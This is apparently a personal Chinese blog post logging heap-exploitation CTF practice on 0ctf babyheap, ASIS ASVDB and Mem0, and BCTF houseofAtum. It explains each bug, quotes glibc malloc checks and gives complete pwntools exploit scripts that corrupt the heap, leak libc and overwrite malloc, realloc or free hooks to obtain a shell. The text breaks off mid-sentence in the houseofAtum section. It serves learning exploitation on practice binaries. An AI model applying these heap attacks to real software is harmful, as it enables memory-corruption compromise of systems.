---
title: 堆刷题
categories:
  - bin
  - pwn
  - 堆
  - linux堆
abbrlink: 544fc13d
date: 2020-01-18 23:05:10
tags:
---

# 堆刷题

这是自己做的练习, 记录下,同时没有找到堆练习带wp的完整的项目,自己创了个

## 0ctf



我刷了一堆攻防世界的题，全特么是栈题，已经自闭了，github找了个项目，堆习题集，开始刷起


### 0ctf-2018-babyheap

| 运行环境 | 版本号        |
| -------- | ------------- |
| 操作系统 | parrot5.4.0-2 |
| libc版本 | 2.23          |
| pwntools | 2.7版本       |

#### 漏洞点

```c
int __fastcall sub_E88(__int64 a1)
{
  unsigned __int64 v1; // rax
  signed int v3; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  v3 = sub_140A();
  if ( v3 >= 0 && v3 <= 15 && *(_DWORD *)(24LL * v3 + a1) == 1 )
  {
    printf("Size: ");
    LODWORD(v1) = sub_140A();
    v4 = v1;
    if ( (signed int)v1 > 0 )
    {
      v1 = *(_QWORD *)(24LL * v3 + a1 + 8) + 1LL; //off-by-one
      if ( v4 <= v1 )
      {
        printf("Content: ");
        sub_1230(*(_QWORD *)(24LL * v3 + a1 + 16), v4);
        LODWORD(v1) = printf("Chunk %d Updated\n", (unsigned int)v3);
      }
    }
  }
  else
  {
    LODWORD(v1) = puts("Invalid Index");
  }
  return v1;
}
```

update这里有个单字节溢出，堆里的off-by-one很强大的，通过这个我们可以overlap


#### 漏洞利用

我能想到overlap，到后面我也不知道用什么攻击方法了，看了writeup后，好多用修改topchunk的方法，然后通过calloc修改realloc_hook,最后拿shell,main_arena+88里存了topchunk的地址，所以可以修改main_arena+88进而修改topchunk。

程序在第一次malloc的时候，heap会分成两块，一块给用户，剩下的就是top chunk。当所有的bin无法满足用户请求的大小时，如果其大小不小于指定的大小就进行分配，并将剩下的部分作为新的top chunk。否则对heap进行扩展后在进行分配。

所以我们修改topchunk为伪造的过后，我们就从那个伪造的地址开始进行分配堆块，这样就达到了攻击的目的

main_arena+8 开始存放bins的头指针，分别为0x20，0x30,0x40,0x50,0x60,0x70,0x80,我们需要错位伪造size的话，需要一个0x28开头地方的指针，也就是0x50大小的堆块，所以要申请一个0x50大小的堆块

#### 不清楚的点

问题1: 在修改第二个堆块的size大小时候，free的时候为什么不会报错?house of spirit技术需要伪造size，而这里为什么不需要？

解答：经过查阅资料，house of spirit技术是free 伪造的fastbin，才需要bypass检查，因为这个检查是针对于fastbin的，看源代码

```c
    /*
      If eligible, place chunk on a fastbin so it can be found
      and used quickly in malloc.
    */

    if ((unsigned long) (size) <= (unsigned long) (get_max_fast())

#if TRIM_FASTBINS
        /*
      If TRIM_FASTBINS set, don't place chunks
      bordering top into fastbins
        */
       //默认 #define TRIM_FASTBINS 0，因此默认情况下下面的语句不会执行
       // 如果当前chunk是fast chunk，并且下一个chunk是top chunk，则不能插入
        && (chunk_at_offset(p, size) != av->top)
#endif
            ) {
        // 下一个chunk的大小不能小于两倍的SIZE_SZ,并且
        // 下一个chunk的大小不能大于system_mem， 一般为132k
        // 如果出现这样的情况，就报错。
        if (__builtin_expect(
                chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ, 0) ||
            __builtin_expect(
                chunksize(chunk_at_offset(p, size)) >= av->system_mem, 0)) {
            /* We might not have a lock at this point and concurrent
               modifications
               of system_mem might have let to a false positive.  Redo the test
               after getting the lock.  */
            if (have_lock || ({
                    assert(locked == 0);
                    __libc_lock_lock(av->mutex);
                    locked = 1;
                    chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ ||
                        chunksize(chunk_at_offset(p, size)) >= av->system_mem;
                })) {
                errstr = "free(): invalid next size (fast)";
                goto errout;
            }
            if (!have_lock) {
                __libc_lock_unlock(av->mutex);
                locked = 0;
            }
        }
        // 将chunk的mem部分全部设置为perturb_byte
        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);
        // 设置fast chunk的标记位
        set_fastchunks(av);
        // 根据大小获取fast bin的索引
        unsigned int idx = fastbin_index(size);
        // 获取对应fastbin的头指针，被初始化后为NULL。
        fb               = &fastbin(av, idx);

        /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
        // 使用原子操作将P插入到链表中
        mchunkptr    old     = *fb, old2;
        unsigned int old_idx = ~0u;
        do {
            /* Check that the top of the bin is not the record we are going to
               add
               (i.e., double free).  */
            // so we can not double free one fastbin chunk
            // 防止对 fast bin double free
            if (__builtin_expect(old == p, 0)) {
                errstr = "double free or corruption (fasttop)";
                goto errout;
            }
            /* Check that size of fastbin chunk at the top is the same as
               size of the chunk that we are adding.  We can dereference OLD
               only if we have the lock, otherwise it might have already been
               deallocated.  See use of OLD_IDX below for the actual check.  */
            if (have_lock && old != NULL)
                old_idx = fastbin_index(chunksize(old));
            p->fd = old2 = old;
        } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) !=
                 old2);
        // 确保fast bin的加入前与加入后相同
        if (have_lock && old != NULL && __builtin_expect(old_idx != idx, 0)) {
            errstr = "invalid fastbin entry (free)";
            goto errout;
        }
    }
```

所以不需要伪造size

问题2: 为什么exp有时候会失败？

解释: 因为堆的不确定性，我们这个办法是通过main_arena里存放了一系列bin的情况下才可以攻击的，而这些bin都是我们申请得来的，申请的堆块地址具有不确定性，经过测试，如果申请的堆块开头是0x56开头就可以成功，0x55开头就会失败,具体可以calloc多一些，让其达到0x56就可以必定成功，原因暂时不详，留住

#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
context.terminal =  ['mate-terminal','--geometry=120x54--10+0','--hide-menubar', '-x','sh','-c',]
exe = '/tmp/tmp.9suWrZDsPa/babyheap'
# Load it if has exe
try:
    context.binary = exe
    elf = ELF(exe)
except Exception as e:
    print("Elf can't be load")

# load libc 
libc = elf.libc if context.binary else ELF("./libc.so.6")


if local:
    io = process(exe)
else:
    io = remote(host,port, timeout=10)
#don't forget to change it
s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        ga('b *{}'.format(hex(text_base+addr)))
    else:
        ga("b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    return map(int, os.popen("one_gadget --raw " + filename).readlines()[0].split(' '))

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled

def c(idx):
    sla("Command: ", idx)

def new(size):
    c(1)
    sla("Size: ", size)

def update(idx, size, content):
    c(2)
    sla("Index: ", idx)
    sla("Size: ", size)
    sla("Content: ", content)

def show(idx):
    c(4)
    sla("Index: ", idx)

def delete(idx):
    c(3)
    sla("Index: ", idx)



def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)

    #start 
    
    # first leak libc
    new(0x48) # 0
    new(0x48) # 1
    new(0x48) # 2
    new(0x48) # 3
    update(0, 0x49, "a"*0x48 + '\xa1') # 0x50+0x50=0xa0，为了刚好让其重叠
    delete(1)
    new(0x48) # 1
    show(2)
    ru("Chunk[2]: ")
    addr = uu64(r(6))
    
    main_arena = addr - 88
    lg("main_arena", main_arena)
    libc.address = addr - 0x3c4b78
    lg("libc_base", libc.address)
    new(0x48) #4
    new(0x50) #5 这里用来错位伪造的
    delete(5)
    delete(1) 
    delete(2) # 通过修改4可以修改2的fd
    
    update(4, 0x9, p64(main_arena+37))
    new(0x48) #1
    new(0x48) #2
    # 这里已经申请到main_arena处地址了，接下来就要修改top chunk了
    # 88-37+0x10因为堆头占0x10
    update(2, 0x2c, "\x00" *0x23 + p64(main_arena-0x38))
    new(0x38) #5
    # 修改realloc_hook
    update(5, 0x20, "a"*0x10 + p64(libc.address + one_gadget[1])*2)
    new(0x10)
    ga()
    ia()
if __name__ == '__main__':
    exp(host,True)


```

### 0ctf-2018-babyheap1804

| 运行环境 | 版本号        |
| -------- | ------------- |
| 操作系统 | parrot5.4.0-2 |
| libc版本 | 2.27          |
| pwntools | 2.7版本       |



#### 漏洞点

与上题一样

#### 漏洞利用

18.04加入了tcache机制，泄露libc有点麻烦，后面通过off-by-one，多次利用，就泄露libc了，有一些注意的点

bypass检测

- malloc.c #1402 这里是报错
- malloc.c #4276 这里检测
- malloc.c #4299 这里调用

```c
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      malloc_printerr ("double free or corruption (!prev)");
```

首先需要过掉next_chunk的 pre_insue检测，也就是说下一个chunk的标志位要为1，接下来需要过掉

```c
      /* consolidate forward */
      if (!nextinuse) {
	unlink(av, nextchunk, bck, fwd);
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0);

```

这里标志位过了后就要unlink，unlink跳转到1402行看

```c
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");			      \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (chunksize_nomask (P))			      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```

其中最重要的就是

```c
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
```

这个检测，这个p是我们传进来的nextchunk，然后再取next_chunk的pre_size要跟next_chunk的next_chunk的size相同，所以我们要伪造两个假堆块,

a-> fake1 -> fake2
fake1结构 跟fake2结构均要伪造

这个泄露libc的思路学到了，通过多次off-by-one然后构造一条伪造的tcache链条


#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
context.terminal =  ['mate-terminal','--geometry=120x54--10+0','--hide-menubar', '-x','sh','-c',]
exe = '/tmp/tmp.ugue2H5ck0/babyheap1804'
# Load it if has exe
try:
    context.binary = exe
    elf = ELF(exe)
except Exception as e:
    print("Elf can't be load")

# load libc 
libc = elf.libc if context.binary else ELF("./libc.so.6")


if local:
    io = process(exe)
else:
    io = remote(host,port, timeout=10)
#don't forget to change it
s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        ga('b *{}'.format(hex(text_base+addr)))
    else:
        ga("b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    return map(int, os.popen("one_gadget --raw " + filename).readlines()[0].split(' '))

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled

def c(idx):
    sla("Command: ", idx)

def new(size):
    c(1)
    sla("Size: ", size)

def update(idx, size, content):
    c(2)
    sla("Index: ", idx)
    sla("Size: ", size)
    sla("Content: ", content)

def show(idx):
    c(4)
    sla("Index: ", idx)

def delete(idx):
    c(3)
    sla("Index: ", idx)

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)

    #start here
    for i in xrange(8):
        new(0x18)
    for i in range(7)[::-1]:
        update(i, 0x19, 'a'*0x18+'\xf1')
        delete(i+1)
    new(0x18) #1
    new(0x18) #2
    new(0x58) #3
    new(0x58) #4 这三个是为0xf1做准备的
    new(0x58) #5
    new(0x18) #6
    new(0x18) #7
    update(1, 0x19, 'a'*0x18 + '\x31')
    delete(2)
    new(0x28) #2
    update(2, 0x19, 'a'*0x10 + p64(0)+ '\xf1')
    # malloc.c #1402 这里是报错
    # malloc.c #4276 这里检测
    # malloc.c #4299 这里调用
    update(5, 0x50, flat([0, 0, 0, 0, 0xf0, 0x21, 0, 0, 0, 0x21]))
    delete(3) #3 未使用
    show(2)
    ru('\x00'*7)
    ru('\x00'*7)
    addr = uu64(r(6))
    lg("addr", addr)
    libc.address = addr - 0x3ebca0

    # tcache 攻击
    update(5, 0x59, 'a'*0x58 + '\x31')
    #delete(1)
    delete(6)
    delete(7)
    new(0x28) #3
    update(3, 0x28, flat([0, 0, 0, 0, libc.symbols['__free_hook']]))
    new(0x18) #6
    new(0x18) #7
    update(0, 0x8, "/bin/sh\x00")
    update(7, 0x8, p64(libc.symbols['system']))
    delete(0)
    ia()
if __name__ == '__main__':
    exp(host,)
```

### 0ctf-2017-babyheap

| 运行环境 | 版本号        |
| -------- | ------------- |
| 操作系统 | parrot5.4.0-2 |
| libc版本 | 2.23          |
| pwntools | 2.7版本       |



#### 漏洞点

编辑部分没有做好size限制,然后随意编辑,堆溢出,然后常规的,unsortbin attack + 打malloc_hook



#### 细节点

我这里要改成unsortedbin的话, 我来个0x10,0x68,0x68,我将第0块溢出为0x70*2 +1就行,因为0x68实际大小申请为0x70



#### exp



```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './babyheap_0ctf_2017'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def c(idx):
    sla(': ', idx)

def new(size):
    c(1)
    sla(": ", size)

def edit(idx, size, content):
    c(2)
    sla(": ", idx)
    sla(": ", size)
    sla(": ", content.ljust(size,'a'))

def show(idx):
    c(4)
    sla(": ", idx)

def delete(idx):
    c(3)
    sla(": ", idx)

def get_libc(idx):
    show(idx)
    rl()
    return uu64(r(6))

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new(0x10) #0
    new(0x68) #1
    new(0x68) #2
    new(0x68) #3
    new(0x40) #4
    edit(0, 0x19, flat([p64(0)*3+ '\xe1']))
    delete(1)
    new(0x68) #1
    libc.address = get_libc(2) - 0x3c4b20 - 88
    lg("libc", libc.address)
    
    new(0x68) #5--2
    delete(3)
    delete(2)
    edit(5, 0x10, p64(libc.sym['__malloc_hook']-0x23))
    new(0x68) #2
    new(0x68) #3
    edit(3, 0x13+8, 'a'*0x13 + p64(libc.address + one_gadget[1]))
    new(0x68)
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

```





## ASIS



###  ASVDB



#### 漏洞点

在new部分, 如果

![image-20200401202422323](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001129.png)

这里size没判断好,然后为0的话,可以不申请description,也就是说,你free过后,在申请这个堆块,用的是被释放掉的description,造成了uaf, 同样的,还可以free后,在new(0,''),这样还是用的被free堆块的description,然后再次free就可以造成double free



结构相对复杂,漏洞但比较简单的题目,利用uaf和double free两个洞就可以, 看别人exp真难看懂,自己写都比看别人的快感觉,具体注释位置写完了

#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './asvdb'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
def c(idx):
      sla("> ", idx)
  
def new(length, description, title="1",year="1", idx="1", severity="1"):
    c(1)
    sla("Enter year: ", year)
    sla("Enter id: ", idx)
    if len(title) == 63:
        sa("Enter title (Up to 64 chars): ", title)
    else:
        sla("Enter title (Up to 64 chars): ", title)
    sla("Enter description size: ", length)
    if length == 0:
        pass
    elif len(description) >= length-1:
        sa("Enter description: ", description)
    else:
        sla("Enter description: ", description)
    sla("): ", severity)
 
def show(idx):
    c(4)
    sla("Enter bug index: ", idx)
 
def free(idx):
    c(3)
    sla("Enter bug index: ", idx)
 
def get_heap(idx):
    show(idx)
    ru("Description: ")
    return uu64(rl())

def get_libc(idx):
    show(idx)
    ru("title: ")
    return uu64(r(6))

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)

    new(0x10,"0") #0
    new(0x10,"1") #1
    new(0x60,"2") #2
    
    # uaf
    free(1)
    free(0)
    new(0x0, '') #0
    heap = get_heap(0)-0x3b0
    lg("heap", heap)
    
    # double free
    free(0)
    new(0x10, p64(heap+0x3d0)) #0
    new(0x10, p64(0)) #1
    new(0x18, p64(0) + p64(elf.got['puts'])) #3
    libc.address = get_libc(2) - libc.sym['puts']
    lg("libc", libc.address)
    
    # double free
    free(1)
    free(0)
    new(0x0,'')
    free(0)
    ga()
    new(0x10, p64(libc.sym['__free_hook'])) #0
    new(0x10, 'sh\x00') # 1
    new(0x10, p64(libc.sym['system'])) #4
    free(1)

    
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("subprocess not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,)

```





### Mem0



#### 漏洞点

![image-20200401232805686](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001130.png)

读取函数,如果结尾不是\n的话会造成off-by-one

开头编辑函数写错了,导致未知名错误...他把python的输出,当成输入了...

这里注意的是tcache最大的大小,绕过这个大小就可以用unsortedbin泄露了,后面的常规套路





#### exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './memo'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
def c(idx):
    sla("> ", idx)

def new(size, content):
    c(1)
    sla(": ", size)
    if len(content) == size:
        sa(": ", content)
    else:
        sla(": ", content)

def edit(idx, content):
    c(2)
    sla(": ", idx)
    sla(": ", content)

def show(idx):
    c(4)
    sla(": ", idx)

def delete(idx):
    c(3)
    sla(": ", idx)

def get_libc(idx):
    show(idx)
    ru("content: ")
    return uu64(r(6))

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)

    for i in range(6):
        new(0xf0, str(i)*0xf0)
    new(0x4f0, '6'*0x4f0)
    new(0x30, '7'*0x30)
    new(0x4f0, '8'*0x4f0)
    new(0xf0, '9'*0xf0)

    for i in range(6):
        delete(i)
    delete(9)
    delete(6)
    delete(7)

    new(0x38, "0"*0x30 + p64(0x540)) #0
    delete(8)
    new(0x4f0, '1'*0x4f0) #1
    libc.address = get_libc(0) - 0x3ebca0
    lg("libc", libc.address)
    
    new(0x68, "2222") #2 -- 0
    delete(0)
    edit(2, p64(libc.sym['__free_hook']))
    new(0x68, '/bin/sh\x00') #0
    new(0x68, p64(libc.address + one_gadget[1]))#3
    delete(0)
    #ga()
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("subprocess not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

```



## BCTF

这个题目很难,先放着吧,我先做别的ctf

###  houseofAtum

标签: tcache perthread corruption

#### 漏洞点

![image-20200402081609233](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001131.png)

这里free的时候,没有将chunk的fd和bk指针清空,造成uaf

#### 漏洞利用

这道题对我来说挺难的,一天看下来没什么头绪,还是从头开始调试起,开头uaf不调试了

```python
    new("1") #0
    new("1") #1
    delete(1, 'y')
    delete(0, 'y')
    new("1") #0
    show(0)
    ru('tent:')
    heap_addr = uu64(r(6)) - 0x231
    lg("heap", heap_addr)
```

前面的是uaf代码,然后伪造堆块结构

```python
    delete(0, 'y')
    payload = flat([
        p64(0)*7,
        p64(0x61),
        p64(heap_addr + 0x68),
    ])
    new(payload) #0
    new("123") #1
```

![image-20200402173234495](https://gitee.com/NoOne-hub/picture/raw/master/img/20200405001132.png)

这里看到,伪造了一个堆结构,0x60大小的堆块,同时让这个堆块的tcache_entry指向tcache_perthread_struct的0x50的链表头起始位置,接下来是与如下描述相同的poc代码

It’s easy than it sounds. Take a look at the `POC` below

```c
void *a = malloc(0x28);
void *b = malloc(0x28);

// fill the tcache
for(int i=0; i<7 ;i++){
    free(a);
}

free(b);

//What will happen with this:
free(a);
```

Get the idea?

Before the last free, the heap is like:

```
 tcache                                 a
+-------+                    +-----------+-----------+
|       +-------------+      | prev_size |   size    |
+-------+             |      +-----------+-----------+
|       |             +------>  fd                   <-------+
+-------+                    |                       |       |
|       |                    |                       |       |
+-------+                    +------------+----------+       |
                                          |                  |
                                          +------------------+


fastbin                                 b
+-------+                    +-----------+-----------+
|       +-------------+      | prev_size |   size    |
+-------+             |      +-----------+-----------+
|       |             +------>  fd                   |
+-------+                    |                       |
|       |                    |                       |
+-------+                    +-----------------------+
```

After the last free, it becomes:

```
 tcache                                 a
+-------+                    +-----------+-----------+
|       +-------------+      | prev_size |   size    |
+-------+             |      +-----------+-----------+
|       |             +------>  fd                   +-------+
+-------+                    |                       |       |
|       |                    |                       |       |
+-------+                    +-----------------------+       |
                                                             |
                                                         +---+
                                                         |
fastbin                                 a                |            b
+-------+                    +-----------+-----------+   | +-----------+-----------+
|       +-------------+      | prev_size |   size    | +-+-> prev_size |   size    |
+-------+             |      +-----------+-----------+ |   +-----------+-----------+
|       |             +------>  fd=b                 +-+   |  fd=0                 |
+-------+                    |                       |     |                       |
|       |                    |                       |     |                       |
+-------+                    +-----------------------+     +-----------------------+
```

Oh no! The `prev_size` of `b` will be used as the `fd` of the `tcache`! And this field can be controled by us!

```python
    new(payload) #0
    new("123") #1
    for i in range(7):
        delete(0, 'n')
    delete(1, 'y')
    delete(0, 'y')
    new("123") # a--0
    new("123") # b--1
```

造成这个偏移过后

